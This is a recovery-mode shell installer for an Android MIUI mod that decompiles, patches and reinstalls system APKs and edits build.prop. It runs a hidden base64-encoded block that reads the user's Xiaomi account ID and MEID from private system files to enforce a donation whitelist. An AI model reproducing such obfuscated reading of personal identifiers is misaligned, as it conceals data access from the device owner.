#!/sbin/sh

OUTFD=$2
ZIP=$3

umask 022
mount /data 2>/dev/null


# Print
ui_print() {
echo -n -e "ui_print $1\n" > /proc/self/fd/$OUTFD
echo -n -e "ui_print\n" > /proc/self/fd/$OUTFD
}

Loggg(){
# Log
cd /
echo > $VHMI/$(GP id).txt
for dkkkl in /tmp/*.*; do
if [ "${dkkkl##*.}" == "txt" ] || [ "${dkkkl##*.}" == "log" ];then
echo "Name: $dkkkl

$(cat $dkkkl)




" >> $VHMI/$(GP id).txt
fi
done

export PATH=$PATH2
rm -fr $TMPI $TBIN $TAPK /data/system/package_cache/* /data/resource-cache/* /data/dalvik-cache/*/*framework*
}

Umont (){
# Umount
for ii in /system_root /system /system_ext /vendor /cust /product; do
#mount -o ro,remount $ii 2>/dev/null || mount -o ro,remount $ii 2>/dev/null
umount $ii 2>/dev/null || umount $ii 2>/dev/null
done
}

# Mount
for i in /system /system_root /system_ext /vendor /cust /product; do
if [ "$(grep -cm1 "$i " /etc/fstab)" == 1 ];then
ui_print "- Mount $i"
mount "$i" 2>/dev/null || mount "$i" 2>/dev/null
mount -o rw,remount "$i" 2>/dev/null || mount -o rw,remount "$i" 2>/dev/null
fi
done

set_perm() {
chown $2:$3 $1 || return 1
chmod $4 $1 || return 1
local CON=$5
[ -z $CON ] && CON=u:object_r:system_file:s0
chcon $CON $1 || return 1
}

set_perm_recursive() {
find $1 -type d 2>/dev/null | while read dir; do
set_perm $dir $2 $3 $4 $6
done
find $1 -type f -o -type l 2>/dev/null | while read file; do
set_perm $file $2 $3 $5 $6
done
}

# Get
GP() { grep -m1 "$1=" /tmp/module.prop | cut -d '=' -f2; }

abort(){
ui_print "$1";
Loggg
Umont
exit 1;
}

# Volume keys
Vk(){ 
input2="$1"; input=1
Kgg(){ 
Key="$(getevent -qlc 1 | awk '{print $3}')"
if [ "$Key" == "KEY_POWER" ];then
abort
elif [ "$Key" == "KEY_VOLUMEUP" ];then
[ "$input" == "$input2" ] && input=1 || input=$(($input + 1))
ui_print "  $input"
sleep 0.3
Kgg
elif [ "$Key" == "KEY_VOLUMEDOWN" ];then
ui_print " "
ui_print "  Chon: $input"
ui_print " "
sleep 0.3
else Kgg; fi; }
Kgg
}

# Unpack
unzip -o "$ZIP" 'module.prop' 'install.sh' 'system.prop' -d /tmp
chmod 777 /tmp/install.sh
TMPI="/tmp/lib"
TBIN="/tmp/bin"
VHMI="/sdcard/VH-MI"
Overlay="$(find /product /*/product /*/*/product -type d -name "overlay" 2>/dev/null | head -n1)"
Buildprop="$(find /system /system_root/system -type f -name 'build.prop' 2>/dev/null | head -n1)"
Themes="$(find /*/media/theme /*/*/media/theme /*/*/*/media/theme -type f -name default.mtz 2>/dev/null | head -n1)"
TAPK="/tmp/lapk"

# Tạo TM
mkdir -p $VHMI $TAPK/tmp

# Unpack bin
unzip -qo "$ZIP" 'bin/*' -d /tmp
set_perm_recursive $TBIN 0 2000 0777 0777 2>/dev/null
$TBIN/busybox --install -s $TBIN
PATH2=$PATH
export PATH=$TBIN:$PATH

# Thay thế bin
zip (){ $TBIN/zip "$@"; }
sed (){ $TBIN/toybox sed "$@"; }
find (){ $TBIN/toybox find "$@"; }
grep (){ $TBIN/toybox grep "$@"; }
cut (){ $TBIN/toybox cut "$@"; }
XHex(){ $TBIN/toybox xxd -p "$@" | tr -d "\n" | tr -d ' '; }
ZHex(){ $TBIN/toybox xxd -r -p "$@"; }

# Check API ABI
API=$(getprop ro.build.version.sdk)
ABI=$(getprop ro.product.cpu.abi)
[ "$ABI" ] || ABI=$(getprop ro.vendor.product.cpu.abilist64)

# Check arm
if [ "$ABI" = "x86" ]; then
export ARCH=x86
elif [ "$ABI" = "arm64-v8a" ]; then
export ARCH=arm64
elif [ "$ABI" = "x86_64" ]; then
export ARCH=x64
else
export ARCH=arm
export ABI=armeabi-v7a
fi

[ "$API" -ge 31 ] && miuik='miui-'

# Mod Tool
baksmali () { java -jar "$TMPI/baksmali-2.3.4.jar" "$@"; }
smali () { java -jar "$TMPI/smali-2.5.2.jar" "$@"; }

# Tìm kiếm 
Timkiem(){ find $TAPK/$2 -name "*.smali" -exec grep -l "$1" {} +; }

# Thay đổi smali
Vsmali(){
for Vka in $(find $4 -name "*.smali" -exec grep -l "$1" {} +); do
[ -e $Vka ] && ui_print "  MOD: $RANDOM"
[ -e $Vka ] && sed -i -e "/^$1/,/$2/c $(echo "$3" | sed -z 's|\n|\\n|g')" "$Vka"
[ -e $Vka ] && echo "$Vka" >> $TAPK/$(echo "$4" | sed "s|$TAPK/||g" | cut -d '/' -f1)/class
done
}

Thaythe(){
ui_print "  MOD: $RANDOM -> $RANDOM"
for Tt2 in $(find $3 -name "*.smali" -exec grep -l "$1" {} +); do
[ -e "$Tt2" ] && sed -i "s|$1|$2|g" $Tt2 || ui_print "- Loi: $1"
[ -e "$Tt2" ] && echo "$Tt2" >> $TAPK/$(echo "$3" | sed "s|$TAPK/||g" | cut -d '/' -f1)/class
done
}

Autoone(){
ui_print "  MOD: $RANDOM -> $RANDOM"
for vakkddhh in $(find $3 -name "*.smali" -exec grep -l "..., $1" {} +); do
echo "sed -i $(grep "..., $1" "$vakkddhh" | awk '{print "-e \"s|sget-boolean "$2" '$1'|const/4 "$2" '$2'|g\"" }' | sort | uniq | tr '\n' ' ') $(echo "$vakkddhh" | sed 's|\$|\\\$|g')" | sh
echo "$vakkddhh" >> $TAPK/$(echo "$3" | sed "s|$TAPK/||g" | cut -d '/' -f1)/class
done
}

# Tim apk path
Papkhhjg="$(echo /*/app /*/framework /*/priv-app /*/*/app /*/*/framework /*/*/priv-app /*/*/*/framework /*/*/*/priv-app)"

Fapk(){
TdataApp="$(find -type f /data/app/* -name "*$1-*")"
[ -e "$TdataApp" ] && PTapk="$(find -type f $TdataApp -name base.apk | head -n1)"
STapk="$(find -type f $Papkhhjg -name "$2" -not -path "*/data/*" | head -n1)"
echo "$STapk" | tee "$TAPK/$1.txt"
if [ "$PTapk" ];then
cp -rf "$PTapk" "$TAPK/$1.apk"
rm -fr $TdataApp
else
[ -e "$STapk" ] && cp -rf "$STapk" "$TAPK/$1.apk" || abort "- Loi: $1 - $2"
fi; }

Fjar(){
STjar="$(find -type f $Papkhhjg -name "$1".jar -not -path "*/data/*" | head -n1)"
[ -e "$STjar" ] && cp -rf "$STjar" "$TAPK" || abort "- Loi: $1"
echo "$STjar" | tee "$TAPK/$1.txt"; }

# Giải nén
UnApk(){
for vapk in $TAPK/*.*; do
if [ "${vapk##*.}" == 'apk' ] || [ "${vapk##*.}" == 'jar' ];then
PTd="$(cat ${vapk%.*}.txt)"
[ -e "$vapk" ] && ui_print "  Unpack: ${PTd##*/}" || abort "- Loi khong tim thay! ${PTd##*/}"
ui_print " "
mkdir -p ${vapk%.*}
unzip -qo "$vapk" '*.dex' -d ${vapk%.*}
for vsmali in ${vapk%.*}/*.dex; do
baksmali d --api $API $vsmali -o ${vsmali%.*}
done
fi
done; }

# Đóng gói
RepApk(){
for bapk in $TAPK/*.*; do
if [ "${bapk##*.}" == 'apk' ] || [ "${bapk##*.}" == 'jar' ];then
PTb="$(cat ${bapk%.*}.txt)"
ui_print "  Repack: ${PTb##*/}"
ui_print " "
for bsmali in $(cat ${bapk%.*}/class | sed "s|$TAPK/||g" | cut -d '/' -f2 | sort | uniq); do
rm -fr "$bsmali".dex
smali a --api $API ${bapk%.*}/$bsmali -o "${bapk%.*}/$bsmali".dex
done
cd ${bapk%.*}
zip -qr -0 $bapk '*.dex'
zipalign -f 4 $bapk $TAPK/tmp/${bapk##*/} 
cp -rf $TAPK/tmp/* $TAPK
fi
done

for Capk in $TAPK/*.*; do
if [ "${Capk##*.}" == 'apk' ];then
Papkp="$(cat ${Capk%.*}.txt)"
if [ "$(unzip -l $Capk 2>/dev/null | grep -cm1 "lib/$ABI/")" == 1 ];then
rm -fr ${Papkp%/*}/lib/$ARCH
mkdir -p ${Papkp%/*}/lib/$ARCH
unzip -qo -j $Capk "lib/$ABI/*" -d ${Papkp%/*}/lib/$ARCH
fi
mkdir -p ${Papkp%/*}
cp -rf $Capk "$Papkp"
fi
if [ "${Capk##*.}" == 'jar' ];then
Papkp="$(cat ${Capk%.*}.txt)"
mkdir -p "${Papkp%/*}"
cp -rf $Capk "$Papkp"
fi
done; }

## Check the system devices
[ "$ARCH" == "arm64" ] || abort "- Khong ho tro thiet bi cua ban! $ARCH"

## Introduce
ui_print " "
ui_print "  Ten: $(GP name) $(GP version)"
ui_print " "
ui_print "  Tac gia: $(GP author)"
ui_print " "
ui_print "  Thong tin: $(getprop ro.product.system.device), $API, $ARCH"
ui_print " "

echo 'WyAiJEFQSSIgLWxlIDMwIF0gJiYgaWR0a21pPSIkKGdyZXAgLW0xICJjb20ueGlhb21pIiAvZGF0YS9zeXN0ZW0vc3luYy9hY2NvdW50cy54bWwgfCB0ciAnICcgJ1xuJyB8IGdyZXAgLW0xIGFjY291bnQgfCBjdXQgLWQgXCIgLWYyKSIKWyAiJEFQSSIgLWdlIDMxIF0gJiYgaWR0a21pPSIkKGdyZXAgLWEgLUEyICJjb20ueGlhb21pIiAvZGF0YS9zeXN0ZW0vc3luYy9hY2NvdW50cy54bWwgfCBoZWFkIC1uMiB8IHRhaWwgLW4xIHwgY3V0IC1kICcvJyAtZjEpIgppZGltZWk9IiQoZ3JlcCAtbTEgImtleV9tZWlkX3Nsb3QwIiAvZGF0YS8qLyovY29tLmFuZHJvaWQucGhvbmUvc2hhcmVkX3ByZWZzLyoueG1sIHwgY3V0IC1kICc+JyAtZjIgfCBjdXQgLWQgJzwnIC1mMSkiClRra2c9MQpnd3dnbnJqPSIkKHVuemlwIC1wICIkWklQIiAibGliL0ZMdW5hLyQoZ2V0cHJvcCByby5wcm9kdWN0LmRldmljZSkiIHwgYmFzZTY0IC1kKSIKCmZvciB3eXdtIGluICRnd3dnbnJqOyBkbwpra2loaD0kKGdyZXAgLWFjbTEgJHd5d20gL2RhdGEvc3lzdGVtL3N5bmMvYWNjb3VudHMueG1sKQpbICRra2loaCA9PSAxIF0gJiYgYnJlYWsKaWYgWyAiJGlkaW1laSIgPT0gIiR3eXdtIiBdO3RoZW4Ka2tpaGg9IjEiCmJyZWFrCmZpCmRvbmUKCmlmIFsgIiRra2loaCIgPT0gMSBdO3RoZW4KdWlfcHJpbnQgIiAgSGVsbG86ICRpZHRrbWkiCnVpX3ByaW50ICIgIgplbHNlCnVpX3ByaW50ICIgIElETUk6ICRpZHRrbWkiCnVpX3ByaW50ICIgIgp1aV9wcmludCAiICBNRUlEOiAkaWRpbWVpIgp1aV9wcmludCAiICIKdWlfcHJpbnQgIiAgVGFpIGtob2FuIGN1YSBiYW4ga2hvbmcgY28gdHJvbmcgZGFuaCBzYWNoIgp1aV9wcmludCAiICIKdWlfcHJpbnQgIiAgSGF5IHVuZyBobyAoRG9uYXRlKSBkZSBkdW9jIHRoZW0gdmFvIGRhbmggc2FjaCIKdWlfcHJpbnQgIiAiCmFib3J0ICIgIFF1YSB0cmluaCBjYWkgZGF0IGRhIGJpIGh1eSAhCi4iCmZp' | base64 -d > /tmp/innnn.sh
chmod 777 /tmp/innnn.sh
. /tmp/innnn.sh

# Chạy
. /tmp/install.sh

# Thêm vào build.prop
for kkabs in $(grep = /tmp/system.prop); do
[ "$(grep -cm1 "$(echo $kkabs | cut -d = -f1)=" $Buildprop)" == 1 ] && sed -i "/$(echo $kkabs | cut -d = -f1)=/d" $Buildprop
echo "$kkabs" >> $Buildprop
done

# Dọn dẹp
ui_print "- Don dep..."
ui_print "- Xong"
ui_print " "

Loggg
Umont

exit 0;
